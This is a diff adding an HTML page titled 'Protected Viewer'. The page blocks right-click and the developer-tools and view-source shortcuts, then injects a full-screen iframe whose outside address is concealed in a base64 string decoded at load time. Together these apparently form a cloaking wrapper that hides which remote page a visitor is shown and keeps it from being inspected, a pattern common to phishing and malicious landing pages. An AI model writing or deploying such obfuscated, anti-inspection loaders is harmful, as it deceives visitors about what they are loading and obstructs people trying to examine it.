@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Protected Viewer</title>
+  <style>
+    html, body { margin:0; height:100%; overflow:hidden; background:#000; }
+    iframe { width:100%; height:100%; border:none; }
+  </style>
+</head>
+<body oncontextmenu="return false">
+  <script>
+    document.onkeydown = function(e) {
+      if(e.keyCode==123 || (e.ctrlKey && e.shiftKey && e.keyCode==73) || (e.ctrlKey && e.shiftKey && e.keyCode==74) || (e.ctrlKey && e.keyCode==85)) {
+        alert('Inspection disabled');
+        return false;
+      }
+    };
+    document.write('<iframe src="'+atob("aHR0cHM6Ly96dHhob3N0aW5nLnNpdGUv")+'" allowfullscreen></iframe>');
+  </script>
+</body>
+</html>
